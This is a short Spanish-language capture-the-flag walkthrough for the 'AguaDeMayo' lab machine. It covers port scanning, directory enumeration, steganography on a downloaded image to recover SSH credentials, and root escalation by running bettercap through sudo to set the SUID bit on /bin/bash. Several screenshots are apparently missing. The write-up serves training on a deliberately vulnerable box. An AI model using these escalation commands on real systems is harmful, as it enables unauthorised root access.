Maquina: AguaDeMayo 
Autor: The Hacker Labs
Dificultad: Facil

ping 172.17.0.2 -c 1

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv

Encontramos el puerto 22 y el puerto 80.

Accedemos a la web y encontramos esto:
Vamos a hacer un reconocimiento con gobuster:

Encontramos el directorio images, vamos a acceder:

Vemos una imagen, vamos a descargarla:

Vamos a aplicar esteganografía.

Pero nos pide una contraseña. Si miramos el código fuente de Apache, al final vemos esto:

Vamos a descifrarlo en dcode.fr.

En esta web lo podemos descodificar y nos da este resultado:

la imagen tiene el nombre de agua_ssh. Agua es el usuario y la contraseña es bebeaguaqueessano.

Si hacemos un sudo -l vemos lo siguiente:

Ejecutamos el binario: 
sudo -u root /usr/bin/bettercap

Cambiamos el permiso a suid de la bash
! chmod u+s /bin/bash

Ahora salimos y ejecutamos bash -p seremos root
bash -p

whoami
